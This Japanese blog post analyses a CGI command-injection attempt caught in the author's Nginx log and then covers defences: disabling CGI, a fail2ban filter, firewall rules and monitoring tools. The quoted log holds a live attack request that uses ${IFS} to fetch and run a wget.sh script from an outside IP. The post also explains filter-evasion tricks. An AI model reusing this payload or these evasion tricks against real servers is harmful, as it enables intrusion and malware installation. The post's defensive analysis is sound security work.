---
slug: cgi-injection-log-analysis
title: CGI攻撃の技術的側面
authors: Z. Yuan
image: /ja/img/2025/0430.jpg
tags: [security, fail2ban, ufw, log-analysis]
description: CGIコマンドインジェクション攻撃の手法。
---

私のサーバーが再度攻撃されました。

この世界は本当に悪意に満ちています。

<!-- truncate -->

## CGI とは？

Common Gateway Interface（CGI）は 1993 年に登場した古典的な技術です。その当時、静的なウェブページが主流で、CGI は「動的なコンテンツ」を実現するための革新的な技術として注目されていました。

その動作方式は簡単かつ粗雑です：

1. ブラウザが HTTP リクエストを送信。
2. Web サーバーはリクエストのパスが`/cgi-bin/`に一致すると、「何かしないといけない」と判断。
3. その後、Query String や Header などの情報を環境変数に詰め込む。
4. 次に、外部プログラム（例えば、Perl、Bash、C）をフォークして、それらの変数を処理させる。
5. プログラムは STDOUT を使って HTTP レスポンスを出力。
6. 処理が終わると、プロセスを終了し、次のリクエストで新たにプロセスを立ち上げる。

利点は汎用性が高いことです：OS 上で実行可能な任意の言語で書けます。

しかし、欠点も多く存在します：

- リクエストごとにプロセスを立ち上げるため、パフォーマンスが低下し、サーバーに負荷がかかる。
- 環境変数にはセキュリティ対策がないため、コマンドインジェクションのリスクが高い。
- 実行可能ファイルが公開されたパスに置かれているため、セキュリティが脆弱。
- プロセスの権限が Web サーバーと同等であるため、ユーザーが不注意であれば、攻撃者はサーバーを支配できる。

現在、CGI は PHP-FPM、FastCGI、WSGI など、より安全で効率的なフレームワークに取って代わられています。

しかし、古いシステムでは依然として生き残っており、攻撃者のターゲットとなることがあります。

## 攻撃の兆候

私は日常的に Nginx の error log をチェックしている際に、以下の異常を発見しました：

```log
2025-04-28 14:21:36,297 fail2ban.filter [1723]: WARNING Consider setting logencoding…

b'2025/04/28 14:21:36 [error] 2464#2464: *7393

open() "/usr/share/nginx/html/cgi-bin/mainfunction.cgi/apmcfgupload"
failed (2: No such file or directory),

client: 176.65.148.10,
request: "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxx…0\xb4%52$c%52$ccd${IFS}/dev;wget${IFS}http://94.26.90.205/wget.sh;${IFS}chmod${IFS}+x${IFS}wget.sh;sh${IFS}wget.sh HTTP/1.1",
referrer: "http://xxx.xxx.xxx.xxx:80/cgi-bin/…"\n'
```

この部分に注意してください：

```log
wget${IFS}http://94.26.90.205/wget.sh;
```

これはタイプミスではなく、**完全なコマンドインジェクション**です。

攻撃者は CGI のパラメータを利用して、次の手順を実行しようとしています：

1. `wget.sh`をダウンロード。
2. 実行権限を付与。
3. すぐにスクリプトを実行。

このような悪意のあるスクリプトの内容は様々で、一般的な行動には以下のようなものがあります：

- バックドアアカウントの作成、SSH キーの埋め込み。
- マイニングプログラムの配置（例えば`xmrig`や`kdevtmpfs`）。
- crontab の修正、再起動後に自動復旧するように設定。
- ファイアウォールやセキュリティ監視ツールの停止。

一度感染すると、あなたのサーバーはあなたよりも熱心に働き、収益は他の誰かのポケットに流れることになります。

## 攻撃手法の詳細解析

この種の攻撃は通常、以下の手順で行われます：

- **スキャン**：`GET /cgi-bin/*.cgi`、無差別にリクエストを送り、まだ生きている CGI を探す。
- **注入**：`%52$c`や`${IFS}`などのテクニックを使って、入力フィルタリングや文字列照合を回避。
- **ダウンロード**：`wget http://...`で悪意のあるスクリプトをダウンロード、これらのスクリプトは主に裸機や侵害されたサーバーにホストされていることが多い。
- **実行**：`chmod +x && sh`、権限を広げ、すぐに実行。

ここで紹介する二つの一般的なテクニック：

- `%52$c`：`printf`のフォーマット技法で、元々スタック操作のために設計されています。本例ではオーバーフローには至りませんが、単純なキーワードの照合を回避できます。
- `${IFS}`：Bash の内部フィールド区切り子で、デフォルトでは空白です。空白を`${IFS}`として書くことで、空白をフィルタリングする防御を回避できます。

## 防御策

完璧な防御は存在しませんが、攻撃者に回り道をさせたり無駄な道を歩ませたりすることで、リスクを大幅に減らすことができます。

### 1. CGI モジュールの無効化

```bash
# Apacheの例
sudo a2dismod cgi
sudo a2dismod php7.4

# nginxはCGIをネイティブにサポートしていないので、fcgiwrapのインストールは避けましょう
```

### 2. 通知機能の設定

```bash title="/etc/fail2ban/filter.d/nginx-cgi.conf"
[Definition]
failregex = <HOST> -.*GET .*cgi-bin.*(;wget|curl).*HTTP
ignoreregex =
```

```ini title="/etc/fail2ban/jail.d/nginx-cgi.local"
[nginx-cgi]
enabled  = true
port     = http,https
filter   = nginx-cgi
logpath  = /var/log/nginx/error.log
maxretry = 3
bantime  = 6h
action   = %(action_mwl)s   # メール通知、whois調査、ログサマリーを含む
```

### 3. 基本的なファイアウォール設定

```bash
sudo ufw default deny incoming
sudo ufw allow 22/tcp comment 'SSH'
sudo ufw allow 80,443/tcp comment 'Web'
sudo ufw enable
```

IPv6 を無視せず、同様に制限を設けましょう。

### 4. システム監視

| 機能                           | ツール名                 | インストール方法           |
| ------------------------------ | ------------------------ | -------------------------- |
| リアルタイム監視と警告         | **Netdata**              | `apt install netdata`      |
| ログ分析とトラフィックの視覚化 | **GoAccess**             | `apt install goaccess`     |
| SOC 防御フレームワーク         | **Wazuh** / **CrowdSec** | 公式インストールスクリプト |

- **CrowdSec**：Fail2Ban の進化版で、コミュニティブラックリストと firewall-bouncer プラグインを備えています。
- **Wazuh**：OSSEC の強化版で、Elastic Stack と連携して完全な視覚化ダッシュボードを提供します。

## 結論

異常が発見されなかったからといって、本当に安全だというわけではありません。

観察基準を確立し、定期的にログをチェックすることで、異常が発生した際に即座に発見し、対応できるようになります。

今回の CGI 攻撃は「成功しなかった」ですが、それは相手の技術が拙かったからではなく、私が少し余分に手順を踏んだからです：モジュールを無効化し、ファイアウォールを設定し、Fail2Ban を設定しました。

> **情報セキュリティの本質は「あなたがターゲットかどうか」ではなく、「リスクにさらされているかどうか」です。**

インターネットに接続した瞬間から、すべてのサーバーは世界中のスキャンと攻撃の対象になります。運に頼るのではなく、日々の準備と警戒を怠らないことが重要です。

今回は不審者が遠くからやって来ましたが、幸い私は起きていて、ドアをしっかりとロックしていました。

あなたもそうであることを願っています。
